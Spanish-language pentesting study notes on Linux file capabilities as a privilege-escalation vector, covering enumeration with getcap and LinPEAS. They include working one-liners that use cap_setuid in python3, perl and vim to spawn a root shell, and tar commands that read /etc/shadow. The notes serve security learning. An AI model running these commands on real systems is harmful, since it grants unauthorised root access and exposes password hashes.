# Capabilities

## ¿Qué son?

Metadatos invisibles que dan a un binario un superpoder específico de root sin darle root completo. No se ven con `ls -la` — necesitas `getcap` para encontrarlos.

---

## Diferencia con SUID

```
SUID          → bit visible en permisos (-rwsr-xr-x)
               → find / -perm -4000 2>/dev/null

Capabilities  → metadatos invisibles
               → getcap -r / 2>/dev/null
```

Dos vectores distintos. Hay que buscarlos por separado.

---

## Cómo encontrarlas

```bash
getcap -r / 2>/dev/null
```

Salida:
```
/usr/bin/python3.8 = cap_setuid+ep   ← crítico
/usr/bin/perl      = cap_setuid+ep   ← crítico
/usr/bin/tar       = cap_dac_read_search+ep
```

El `+ep` significa habilitada y efectiva — la más peligrosa.

---

## Las tres que importan

### cap_setuid
Permite cambiar el UID del proceso a 0 (root). La más peligrosa.

### cap_dac_read_search
Permite leer cualquier archivo ignorando permisos. Puedes leer `/etc/shadow`.

### cap_net_raw
Permite capturar tráfico de red. Menos directo para escalar.

---

## Explotación — flujo

```
1. getcap -r / 2>/dev/null
2. Ves binario con cap_setuid+ep
3. Vas a GTFOBins → buscas el binario → pestaña Capabilities
4. Ejecutas el comando → root
```

---

## Ejemplos comunes

### Python con cap_setuid
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Perl con cap_setuid
```bash
perl -e 'use POSIX; setuid(0); exec "/bin/bash"'
```

### Vim con cap_setuid
```bash
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'
```

### tar con cap_dac_read_search
```bash
# Leer /etc/shadow directamente
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

---

## Cómo lo detecta Linpeas

Busca esta sección en el output:
```
╔══════════╣ Capabilities
/usr/bin/python3.8 = cap_setuid+ep
```
Si aparece en rojo o amarillo intenso — vector real.

---

## Resumen mental

```
Encontrar  → getcap -r / 2>/dev/null
Explotar   → GTFOBins pestaña Capabilities
Resultado  → root
```

## Referencias
- https://gtfobins.github.io (filtrar por Capabilities)
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
